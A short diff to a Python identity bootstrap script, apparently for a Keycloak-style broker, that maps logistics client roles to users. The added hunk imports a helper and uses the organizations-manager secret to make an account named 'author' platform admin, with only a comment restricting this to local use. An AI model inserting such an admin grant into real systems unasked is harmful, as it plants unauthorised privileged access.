@@ -76,3 +76,9 @@ api('users/' + account['id'] + '/role-mappings/clients/' + resource, [roles['tra
 users.append(account['id'])
 Path('/cache/logistics-users.json').write_text(json.dumps(users))
 print('Локальные роли и клиенты логистики настроены')
+
+# Выдача полномочий платформы author допустима только в локальном bootstrap.
+import sys
+sys.path.insert(0, '/workspaces/broker/scripts')
+from organization_identity import configure
+configure(api, secrets['organizations-manager-secret'], platform_admin='author')
